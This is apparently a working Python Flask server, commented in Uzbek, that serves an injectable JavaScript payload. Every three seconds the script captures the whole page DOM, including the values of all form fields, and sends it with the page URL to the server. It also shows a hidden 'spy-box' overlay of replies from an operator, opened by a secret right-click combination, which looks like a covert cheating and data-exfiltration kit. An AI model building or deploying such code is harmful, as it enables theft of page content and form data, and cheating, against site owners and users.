from flask import Flask, request, jsonify, Response
from flask_cors import CORS
import os
import hashlib

app = Flask(__name__)

# CORS ruxsatlari
CORS(app, resources={r"/*": {"origins": "*"}})

# SERVER MANZILI
MY_RENDER_URL = "https://mening-serverim.onrender.com"

storage = {
    "html": None,
    "page_url": "",
    "reply": "Javob yo'q",
    "html_id": 0,
    "reply_id": 0,
    "last_hash": ""
}

# --- JAVASCRIPT KOD (Alert qo'shilgan) ---
JAVASCRIPT_TEMPLATE = """
// 1. Ishga tushganini bildirish
alert("✅ TIZIM ISHGA TUSHDI! (YANGI KOD)");

(function(){
    const serverUrl = "SERVER_URL_PLACEHOLDER";

    // --- O'zgaruvchilar ---
    let holdTimer = null;
    let isComboReady = false;
    let rightClickCount = 0;
    let resetTimer = null;
    let lastMessage = "Hozircha javob yo'q..."; 

    // --- GUI QISMI ---
    const oldBox = document.getElementById('spy-box-secret');
    if(oldBox) oldBox.remove();

    const secretBox = document.createElement('div');
    secretBox.id = 'spy-box-secret';
    secretBox.style.cssText = `
        position: fixed; bottom: 50px; left: 50%; transform: translateX(-50%);
        background: rgba(0, 0, 0, 0.9); color: #fff; padding: 15px 30px;
        border-radius: 10px; font-family: sans-serif; font-size: 16px;
        text-align: center; display: none; z-index: 2147483647;
        box-shadow: 0 5px 20px rgba(0,0,0,0.6); border: 1px solid #444;
        backdrop-filter: blur(5px); pointer-events: none;
    `;
    document.body.appendChild(secretBox);

    function showMessage() {
        secretBox.innerHTML = "📩 <b>JAVOB:</b><br>" + lastMessage;
        secretBox.style.display = 'block';
    }

    // --- SICHQONCHA VA BOSHQARUV ---
    document.addEventListener('contextmenu', e => e.preventDefault());

    document.addEventListener('mousedown', (e) => {
        if (e.button === 2) { 
            holdTimer = setTimeout(() => {
                isComboReady = true; 
                rightClickCount = 0;
                secretBox.innerHTML = "🔓 Tizim ochildi!<br>2 marta bosing...";
                secretBox.style.display = 'block';
                setTimeout(() => { if(rightClickCount===0) secretBox.style.display='none'; }, 2000);

                if (resetTimer) clearTimeout(resetTimer);
                resetTimer = setTimeout(() => { isComboReady = false; }, 8000);
            }, 5000); 
        }
    });

    document.addEventListener('mouseup', (e) => {
        if (e.button === 2) {
            if (holdTimer) clearTimeout(holdTimer);
            if (isComboReady) {
                rightClickCount++;
                if (rightClickCount >= 3) {
                    showMessage();
                    isComboReady = false; 
                    rightClickCount = 0;
                }
            }
        }
    });

    document.addEventListener('dblclick', (e) => { 
        if (e.button === 0) {
            secretBox.style.display = 'none';
            isComboReady = false;
        }
    });

    // --- MA'LUMOT YIG'ISH VA YUBORISH ---
    function getFullDom() {
        try {
            document.querySelectorAll('input').forEach(el => {
                if(el.type=='checkbox'||el.type=='radio') el.checked?el.setAttribute('checked','checked'):el.removeAttribute('checked');
                else el.setAttribute('value', el.value);
            });
            document.querySelectorAll('textarea').forEach(el => el.innerHTML=el.value);
            document.querySelectorAll('select').forEach(el => {
                el.querySelectorAll('option').forEach(o => o.selected?o.setAttribute('selected','selected'):o.removeAttribute('selected'));
            });
        } catch(e){}
        return document.documentElement.outerHTML;
    }

    setInterval(() => {
        fetch(serverUrl + '/upload', {
            method: 'POST', 
            headers: {'Content-Type': 'application/json'},
            keepalive: true,
            body: JSON.stringify({html: getFullDom(), page: window.location.href})
        }).then(r=>r.json()).then(data => {
            if(data.reply) {
                lastMessage = data.reply;
                if(secretBox.style.display === 'block' && !isComboReady) {
                    secretBox.innerHTML = "📩 <b>JAVOB:</b><br>" + lastMessage;
                }
            }
        }).catch(e=>{});
    }, 3000);
})();
"""


@app.route('/', methods=['GET'])
def home():
    return "Server is running", 200


# 👇 ENG MUHIM QISM SHU YERDA 👇
@app.route('/script.js', methods=['GET'])
def get_script():
    final_code = JAVASCRIPT_TEMPLATE.replace("SERVER_URL_PLACEHOLDER", MY_RENDER_URL)

    # Javobni tayyorlaymiz
    resp = Response(final_code, mimetype='application/javascript')

    # 1. CORS ruxsati
    resp.headers['Access-Control-Allow-Origin'] = '*'

    # 2. KESHNI BUTUNLAY O'CHIRISH (Cache-Busting)
    # Bu headerlar brauzerga "Bu faylni aslo saqlab qolma, har doim serverdan so'ra" deydi.
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'

    return resp


@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        content = data.get('html', '')
        url = data.get('page', '')
        content_hash = hashlib.md5(content.encode('utf-8')).hexdigest()

        response_data = {"reply": storage['reply']}

        if content_hash != storage['last_hash']:
            storage['html'] = content
            storage['page_url'] = url
            storage['last_hash'] = content_hash
            storage['html_id'] += 1
            response_data["status"] = "new_data"
        else:
            response_data["status"] = "ignored"

        return jsonify(response_data)
    except:
        return jsonify({"status": "error"}), 500


# --- ADMIN ROUTES ---
@app.route('/admin-check', methods=['GET'])
def admin_check():
    return jsonify({"html_id": storage['html_id'], "current_reply": storage['reply']})


@app.route('/admin-get-html', methods=['GET'])
def admin_get_html():
    return jsonify({"html": storage['html']})


@app.route('/admin-reply', methods=['POST'])
def admin_reply():
    msg = request.json.get('message')
    if msg:
        storage['reply'] = msg
        storage['html_id'] += 1
        return jsonify({"status": "OK"})
    return jsonify({"status": "Error"}), 400


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)